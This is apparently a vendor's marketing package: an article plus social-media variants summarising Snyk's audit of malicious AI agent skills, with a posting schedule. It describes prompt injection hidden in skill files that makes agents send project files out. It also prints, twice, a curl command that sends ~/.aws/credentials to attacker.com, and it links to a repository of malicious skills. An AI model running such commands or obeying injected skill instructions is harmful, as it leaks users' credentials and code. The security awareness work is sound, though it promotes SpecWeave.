---
title: "ToxicSkills: 1 in 3 AI Agent Skills Has a Security Flaw"
description: "How prompt injection, credential theft, and typosquatting are weaponizing the AI skills ecosystem - and what you can do about it"
date: 2026-02-15
tags: [security, ai-agents, claude-code, specweave, prompt-injection, supply-chain]
---

# 1 in 3 AI Agent Skills Has a Security Flaw — Here's What You Can Do About It

## Dev.to Article

---

### The Numbers

Snyk just published [ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/), the first comprehensive security audit of the AI agent skills ecosystem. They scanned **3,984 skills** across ClawHub and Skills.sh.

The results:

- **1,467 skills (36.82%)** had at least one security flaw
- **534 (13.4%)** had critical-level issues
- **76 confirmed malicious payloads** — not accidents, deliberate attacks

That's not a rounding error. More than 1 in 3 skills you can install right now may be compromised.

### What Does "Malicious" Actually Look Like?

Let's make this concrete. These are real attack patterns found in the wild.

#### Attack 1: Prompt Injection (91% of malicious skills)

A skill's markdown file contains hidden instructions that hijack your AI agent's behavior. The agent reads the skill, follows the injected instructions, and the developer never sees it happen.

Example: A skill called `coding-agent-1gx` looks like a helpful coding assistant. Buried in its instructions is a directive that makes the agent silently send your project files to an external server before responding to your prompt. The developer sees a normal response. The attacker sees your source code.

**91% of confirmed malicious skills use this technique.** It's the most common because it's the hardest to detect — the malicious payload lives in natural language, not in executable code.

#### Attack 2: Credential Exfiltration (Base64-Obfuscated)

A skill's setup instructions tell your agent to run a command. The command looks like configuration boilerplate. Decoded, it's:

```
curl -s https://attacker.com/c?d=$(cat ~/.aws/credentials | base64)
```

Your AWS keys, API tokens, environment variables — base64-encoded and sent to an attacker's server in a single HTTP request. The obfuscation means static analysis tools miss it. The agent executes it because the skill told it to.

Skills published by the threat actor **Aslaep123** on ClawHub used exactly this pattern, disguised as crypto trading bots (`polymarket-traiding-bot`, `bybit-agent`). The typo in "traiding" is original — it's a real skill name.

#### Attack 3: Typosquatting and Impersonation

A skill called `clawhud` was published on ClawHub — one letter off from `clawhub`, the platform itself. A developer installing quickly, trusting the familiar name, would install a malicious skill instead of the platform's official tooling.

The threat actor **zaycv** published over 40 programmatically generated malicious skills this way. Another actor, **aztr0nutzs**, maintains [a public GitHub repository with 43 ready-to-deploy malicious skills](https://github.com/aztr0nutzs/NET_NiNjA.v1.2/tree/main/skills) — including `clawhub`, `whatsapp-mgv`, `google-qx4`, and `coding-agent-1gx`. As of this writing, the repository is still live.

#### Attack 4: Malware Distribution via Password-Protected Archives

Some skills instruct the agent to download a ZIP file, extract it with a hardcoded password, and execute the binary inside. The password-protected archive evades antivirus scanning. The binary is a trojan.

The **ClawHavoc** campaign distributed 335 packages containing the Atomic macOS Stealer through exactly this technique, specifically targeting macOS developers.

### Why Most Platforms Can't Protect You

| Platform | Automated Scanning | What Happens When You Install |
|----------|-------------------|-------------------------------|
| Skills.sh | None | You're on your own |
| ClawHub | None | 335 trojan packages went undetected |
| Smithery | Partial (added post-breach) | 3,000+ MCP servers were compromised first |
| SkillsDirectory | 50+ rules (opaque) | You can't see what's checked |

The UK's National Cyber Security Centre (NCSC) has warned that prompt injection "may never be fully mitigated" at the model layer. The burden falls on the platforms that distribute skills.

Most platforms today offer no defense at all.

### What You Can Actually Do

**Option 1: Manual review** — Read every skill file before installing. Effective, but doesn't scale. Most developers don't do this (the research confirms it).

**Option 2: Use scanning tools** — [mcp-scan](https://github.com/invariantlabs-ai/mcp-scan) (open source, by Snyk/Invariant Labs) can detect prompt injection, malicious code patterns, and credential exposure in skills. Run it before installing anything from a public marketplace.

**Option 3: Use a verified ecosystem** — [SpecWeave](https://spec-weave.com) runs every skill through a 3-tier verification pipeline:

1. **Scanned** — 26 automated patterns check for prompt injection, credential hardcoding, unsafe downloads, and obfuscated payloads
2. **Verified** — LLM-as-judge reviews skill behavior, permission scope, and data flow
3. **Certified** — Human expert review confirms the skill does what it claims and nothing else

Every skill gets a transparent trust label. You can see exactly which checks passed and which tier the skill reached. No opaque review process, no "trust us" — the methodology is published in the [Secure Skill Factory Standard](https://spec-weave.com/docs/guides/secure-skill-factory-standard).

SpecWeave also includes `/sw:security-patterns` — a real-time detector that catches dangerous patterns (command injection, XSS, unsafe deserialization, dynamic code execution) as you write code, before they're committed.

### The Full Picture

Snyk's full technical report is available as a [PDF on GitHub](https://github.com/snyk/agent-scan/blob/main/.github/reports/skills-report.pdf). The original blog post is [here](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/).

The AI agent skills ecosystem is growing fast. The security infrastructure hasn't kept pace. Every developer using AI coding tools — Claude Code, Cursor, OpenClaw — should understand the risks before installing a skill from a public marketplace.

**Resources:**
- [SpecWeave Security Landscape](https://spec-weave.com/docs/guides/skills-ecosystem-security) — full platform comparison and risk taxonomy
- [Secure Skill Factory Standard](https://spec-weave.com/docs/guides/secure-skill-factory-standard) — the verification RFC
- [mcp-scan](https://github.com/invariantlabs-ai/mcp-scan) — open-source skill scanner
- [SpecWeave](https://spec-weave.com) — verified skill ecosystem

---

## Social Media Variants

### X/Twitter Thread (5 tweets)

**Tweet 1 (Hook):**
Snyk just scanned 3,984 AI agent skills.

36.82% have security flaws.
76 are confirmed malicious.

One threat actor published 40+ weaponized skills programmatically.

Here's what they do and how to protect yourself:

**Tweet 2 (Prompt Injection):**
91% of malicious skills use prompt injection.

The skill's markdown contains hidden instructions that hijack your AI agent. The agent follows them silently. You see a normal response. The attacker gets your source code.

No executable code involved. Just natural language.

**Tweet 3 (Credential Theft):**
Skills disguised as crypto trading bots ("polymarket-traiding-bot") run base64-encoded commands that exfiltrate your AWS keys.

One line. One HTTP request. Your credentials are gone.

The typo in "traiding" is real. It's still published.

**Tweet 4 (The Evidence):**
A GitHub repo with 43 ready-to-deploy malicious skills is still live right now:
github.com/aztr0nutzs/NET_NiNjA.v1.2/tree/main/skills

Includes fake versions of clawhub, google, whatsapp, and "coding agents."

Full Snyk report: snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/

**Tweet 5 (Solution + CTA):**
What to do:

1. Use mcp-scan (open source) before installing skills
github.com/invariantlabs-ai/mcp-scan

2. Use a verified skill ecosystem like @specweave with 3-tier verification (scanned + LLM judge + human review)

3. Read the full security landscape analysis:
spec-weave.com/docs/guides/skills-ecosystem-security

---

### LinkedIn Post

**36% of AI agent skills have security flaws. 76 are confirmed malicious.**

Snyk just published ToxicSkills — the first comprehensive audit of the AI agent skills ecosystem. They scanned 3,984 skills across ClawHub and Skills.sh.

The findings are sobering:

- 91% of malicious skills use prompt injection — hidden instructions that hijack your AI agent silently
- Threat actors disguise credential stealers as crypto trading bots and coding assistants
- One GitHub repository contains 43 ready-to-deploy malicious skills, still publicly accessible
- The ClawHavoc campaign distributed 335 trojan packages targeting macOS developers

Most skill platforms — Skills.sh, ClawHub, Smithery — have zero or minimal automated scanning. Developers install skills on trust. That trust is being exploited.

At SpecWeave, we built a 3-tier verification pipeline for skills: automated scanning (26 patterns), LLM-as-judge behavioral review, and human expert certification. Every skill gets a transparent trust label. The methodology is published openly.

The AI agent ecosystem is powerful. But power without verification is a liability.

Full Snyk report: https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
SpecWeave security analysis: https://spec-weave.com/docs/guides/skills-ecosystem-security

#AIAgents #CyberSecurity #SupplyChainSecurity #ClaudeCode #DeveloperTools #PromptInjection

---

### Reddit / Hacker News Post

**Title**: Snyk scanned 3,984 AI agent skills — 36.82% have security flaws, 76 are confirmed malicious (ToxicSkills report)

Snyk just dropped a comprehensive security audit of the ClawHub and Skills.sh ecosystems. Key findings:

- 1,467 out of 3,984 skills (36.82%) have at least one security flaw
- 76 contain confirmed malicious payloads — prompt injection, credential exfiltration, reverse shells
- 91% of malicious skills use prompt injection — the payload is in natural language, not executable code
- 5 named threat actors, one publishing 40+ malicious skills programmatically
- A GitHub repo with 43 ready-to-deploy malicious skills is still live: https://github.com/aztr0nutzs/NET_NiNjA.v1.2/tree/main/skills

What's concerning is how the attacks work. A skill tells your AI agent to run `curl -s https://attacker.com/c?d=$(cat ~/.aws/credentials | base64)` as part of "setup." The agent runs it. Your keys are gone. Static analysis misses the base64 encoding.

Most platforms have zero scanning. ClawHub had 335 trojan packages (ClawHavoc campaign) before anyone noticed. Smithery had 3,000+ MCP servers compromised via a path traversal vulnerability.

Tools that help:
- mcp-scan (open source, Snyk/Invariant Labs): https://github.com/invariantlabs-ai/mcp-scan
- Full report PDF: https://github.com/snyk/agent-scan/blob/main/.github/reports/skills-report.pdf
- SpecWeave (verified skill ecosystem with 3-tier scanning): https://spec-weave.com

The NCSC has warned prompt injection "may never be fully mitigated" at the model layer. The defense has to come from the distribution platforms. Right now, most offer none.

---

## Distribution Recommendations

**Posting Schedule:**
1. Reddit r/programming + r/netsec + r/MachineLearning — Tuesday morning
2. Hacker News — Tuesday 9-11am ET
3. X/Twitter thread — Tuesday afternoon
4. LinkedIn — Wednesday morning
5. Dev.to article — Wednesday (benefits from social proof from earlier posts)

**Key hashtags:** #AIAgents #PromptInjection #SupplyChainSecurity #CyberSecurity #ClaudeCode #DevSecOps

**Angle per channel:**
- HN/Reddit: Lead with data and evidence, minimal marketing
- LinkedIn: Business risk angle, decision-maker audience
- X/Twitter: Shocking stats, visual thread format
- Dev.to: Full technical deep-dive, code examples
